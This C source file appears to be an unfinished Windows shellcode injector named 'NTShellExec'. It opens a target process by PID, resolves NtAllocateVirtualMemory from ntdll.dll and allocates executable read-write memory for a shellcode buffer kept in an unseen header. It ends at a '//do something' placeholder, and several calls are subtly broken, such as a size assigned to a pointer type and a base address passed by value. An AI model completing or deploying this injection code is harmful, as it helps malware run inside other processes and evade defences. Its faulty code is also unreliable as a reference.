#include <stdio.h>
#include <stdlib.h>
#include <ntstatus.h>
#include <Windows.h>
#include "utils.h"

//https://www.unknowncheats.me/forum/c-and-c-/69367-lame-base-call-nt-functions.html
//https://github.com/zodiacon/ErrorLookup

int NTShellExec(DWORD process_id);

int main(int argc, char* argv[]){
    printf("Loading NTShellExec.... \n\n");

    if(argc == 1 || argc >= 3){
        printf("Select one argument <file.exe> -> PID");
        return EXIT_FAILURE;
    }

    //get pid
    DWORD PID = atoi(argv[1]);

    NTShellExec(PID);

    return EXIT_SUCCESS;
}

int NTShellExec(DWORD process_id){

    //open handle to given process
     //open handle to process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, process_id);

    if(hProcess == NULL){
        printf("error while attempting to get handle to process with PID : %ld -> error : %zd \n", process_id, GetLastError());
        return EXIT_FAILURE;
    };

    //ptr to allocate virtual memory
    LPNTALLOCATEVIRTUALMEMORY ptrAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");

    if(ptrAllocateVirtualMemory == NULL){
        printf("enable to get ptr to NtAllocateVirtualMemory with error : %zd", GetLastError());
    }

    //params
    PVOID rBuffer = NULL;
    PSIZE_T sizeShellCode = sizeof(shellcode_x64);

    NTSTATUS AVMstatus = ptrAllocateVirtualMemory(hProcess, rBuffer, NULL, &sizeShellCode,(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    //do something

    //free(sizeShellCode)
    return EXIT_SUCCESS;
}